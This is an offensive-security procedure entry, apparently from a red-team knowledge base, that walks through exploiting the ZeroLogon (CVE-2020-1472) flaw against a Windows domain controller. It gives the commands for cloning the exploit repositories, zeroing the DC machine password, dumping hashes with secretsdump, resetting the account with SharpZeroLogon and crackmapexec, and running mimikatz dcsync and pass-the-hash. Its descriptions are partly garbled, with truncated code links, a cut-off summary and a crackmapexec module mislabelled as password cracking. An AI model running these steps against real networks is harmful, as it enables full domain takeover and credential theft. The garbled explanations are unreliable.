---
id: 5a3045cf-c013-4c2f-9de6-7883e98a6248
name: ZeroLogon Exploitation and Post-Exploitation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:02.694277+00:00'
updated_at: '2023-04-10T20:36:01.213268+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]'
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
sub_techniques:
- '[[Password Guessing|T1110.001 - Password Guessing]]'
tags:
- '[[Active Directory Attacks]]'
- '[[From CVE to SYSTEM shell on DC]]'
- '[[ZeroLogon]]'
commands:
- '[[Activate virtual environment and install impacket]]'
- '[[Attempt to exploit zerologon vulnerability]]'
- '[[Check for CVE-2020-1472 vulnerability]]'
- '[[Clone nccfsas repository from GitHub]]'
- '[[Clone the exploit repository]]'
- '[[Deactivate virtual environment]]'
- '[[Execute SharpZeroLogon to check vulnerability]]'
- '[[Exploit the CVE]]'
- '[[Find the old NT hash of the DC]]'
- '[[Reset machine account password using SharpZeroLogon]]'
- '[[Restore password from secretsdump]]'
- '[[Test vulnerability patch from non Domain-joined machine]]'
---

# ZeroLogon Exploitation and Post-Exploitation

## Summary

ZeroLogon is a critical vulnerability in Microsoft's Netlogon Remote Protocol (MS-NRPC) that allows an attacker to bypass authentication and gain domain admin privileges. This procedure involves exploiting the ZeroLogon vulnerability to gain SYSTEM access on the Domain Controller, which can be used

## Description

# Description

ZeroLogon is a critical vulnerability in Microsoft's Netlogon Remote Protocol (MS-NRPC) that allows an attacker to bypass authentication and gain domain admin privileges. This procedure involves exploiting the ZeroLogon vulnerability to gain SYSTEM access on the Domain Controller, which can be used to further compromise the Active Directory environment. After gaining SYSTEM access, the attacker can perform various post-exploitation activities, such as password cracking and lateral movement, to achieve their objectives. The business value of this procedure is that it allows an attacker to gain complete control of the Active Directory environment, which can lead to data theft, ransomware attacks, and other malicious activities.

## Requirements

1. Access to a vulnerable Windows domain controller

1. Knowledge of the target Active Directory environment

1. Tools such as SharpZeroLogon and CrackMapExec

## Defense

1. Apply the latest security patches to mitigate the ZeroLogon vulnerability

1. Implement multi-factor authentication to prevent credential theft

1. Monitor Active Directory logs for suspicious activity

## Objectives

1. Gain SYSTEM access on the Domain Controller

1. Perform post-exploitation activities to achieve objectives

# Instructions

1. To use this exploit, first check the target server for vulnerability using the `zerologon_tester.py` script. If the target is vulnerable, clone the exploit repository and install the required dependencies. Then, run the exploit script `cve-2020-1472-exploit.py` with the target server's hostname and IP address as arguments. Finally, use the `secretsdump.py` script to retrieve the old NT hash of the target server's domain controller and use the `restorepassword.py` script to restore the machine password from the hash.

**Code**: [[  # Check (https://github.com/SecuraBV/CVE-2020-14]]

> This command is used to exploit the CVE-2020-1472 vulnerability, also known as Zerologon. The vulnerability allows an attacker to bypass the authentication process and gain access to the domain controller. The exploit involves running a Python script `cve-2020-1472-exploit.py` with the target server's hostname and IP address as arguments. The script uses a cryptographic algorithm to calculate a new machine password and sets it to an empty string. This allows the attacker to gain access to the domain controller without a valid password. The `secretsdump.py` script is used to retrieve the old NT hash of the domain controller, which can be used to restore the machine password using the `restorepassword.py` script. This command should only be used for testing and educational purposes and should not be used to gain unauthorized access to computer systems.

**Command** ([[Check for CVE-2020-1472 vulnerability]]):

```bash
proxychains python3 zerologon_tester.py DC01 172.16.1.5
```

**Command** ([[Clone the exploit repository]]):

```bash
$ git clone https://github.com/dirkjanm/CVE-2020-1472.git
```

**Command** ([[Activate virtual environment and install impacket]]):

```bash
$ python3 -m venv venv
$ source venv/bin/activate
$ pip3 install .
```

**Command** ([[Exploit the CVE]]):

```bash
proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
```

**Command** ([[Find the old NT hash of the DC]]):

```bash
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
```

**Command** ([[Restore password from secretsdump]]):

```bash
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
```

**Command** ([[Deactivate virtual environment]]):

```bash
deactivate
```

2. To use the SharpZeroLogon command, you will need to download the nccfsas .NET binary from the provided GitHub repository. After downloading, use the execute-assembly command to run SharpZeroLogon.exe on the targeted machine. The command can be used with multiple arguments to perform different tasks such as checking, resetting the machine account password, and testing from a non-domain joined machine.

**Code**: [[git clone https://github.com/nccgroup/nccfsas
# Ch]]

> The SharpZeroLogon command is used to exploit the ZeroLogon vulnerability in Microsoft Windows servers. This vulnerability allows an attacker to bypass the authentication process and gain administrative privileges on the targeted machine. The execute-assembly command is used to execute the SharpZeroLogon.exe binary on the targeted machine. The -reset argument is used to reset the machine account password and the -patch argument is used to test the patch for the ZeroLogon vulnerability. It is important to note that this command should only be used for ethical hacking and security testing purposes.

**Command** ([[Clone nccfsas repository from GitHub]]):

```bash
git clone https://github.com/nccgroup/nccfsas
```

**Command** ([[Execute SharpZeroLogon to check vulnerability]]):

```bash
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
```

**Command** ([[Reset machine account password using SharpZeroLogon]]):

```bash
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
```

**Command** ([[Test vulnerability patch from non Domain-joined machine]]):

```bash
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
```

3. This command is used for exploiting the `Zerologon` vulnerability in Windows Active Directory. The command involves checking for the vulnerability, exploiting it, extracting hashes, and passing the hash with the extracted Domain Admin hash. The command can be used by attackers to gain unauthorized access to Windows Active Directory.

**Code**: [[privilege::debug
# Check for the CVE
lsadump::zero]]

> The `lsadump::zerologon` command is used to check for the `Zerologon` vulnerability in Windows Active Directory. The `/target` argument specifies the target machine, and the `/account` argument specifies the account to be used for authentication.

The `lsadump::dcsync` command is used to extract hashes from the Active Directory domain controller. The `/domain` argument specifies the domain, `/dc` argument specifies the domain controller, `/user` argument specifies the user whose hashes are to be extracted, and `/authuser`, `/authdomain`, `/authpassword`, and `/authntlm` arguments are used for authentication.

The `sekurlsa::pth` command is used for passing the hash with the extracted Domain Admin hash. The `/user` argument specifies the user to be impersonated, `/domain` argument specifies the domain, and `/rc4` argument specifies the hash to be used for authentication.

The `lsadump::postzerologon` command is used to reset the password of the computer account to `Waza1234/Waza1234/Waza1234/`. The `/target` argument specifies the target machine, and the `/account` argument specifies the account to be used for authentication.

4. This command is used to identify weak passwords on SMB shares. It uses the tool `CrackMapExec` and connects to the target IP address using the specified username, password, and domain. The `-M` flag is used to specify the module to use for password cracking, in this case `zerologon`.

**Code**: [[crackmapexec smb 10.10.10.10 -u username -p passwo]]

> The `crackmapexec` command is used to perform password cracking on SMB shares. The `smb` parameter specifies the protocol to use for the connection. The IP address of the target is specified after the `smb` parameter. The `-u` flag is used to specify the username to use for authentication. The `-p` flag is used to specify the password to use for authentication. The `-d` flag is used to specify the domain to use for authentication. The `-M` flag is used to specify the module to use for password cracking. In this case, the `zerologon` module is used to identify weak passwords. Note that this command should only be used on systems that you have permission to test and should not be used for malicious purposes.

**Command** ([[Attempt to exploit zerologon vulnerability]]):

```bash
crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Exploitation for Credential Access|T1212 - Exploitation for Credential Access]]
- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]

### Sub-Techniques

- [[Password Guessing|T1110.001 - Password Guessing]]

## Commands Used

- [[Activate virtual environment and install impacket]]
- [[Attempt to exploit zerologon vulnerability]]
- [[Check for CVE-2020-1472 vulnerability]]
- [[Clone nccfsas repository from GitHub]]
- [[Clone the exploit repository]]
- [[Deactivate virtual environment]]
- [[Execute SharpZeroLogon to check vulnerability]]
- [[Exploit the CVE]]
- [[Find the old NT hash of the DC]]
- [[Reset machine account password using SharpZeroLogon]]
- [[Restore password from secretsdump]]
- [[Test vulnerability patch from non Domain-joined machine]]

## Tags

- [[Active Directory Attacks]]
- [[From CVE to SYSTEM shell on DC]]
- [[ZeroLogon]]
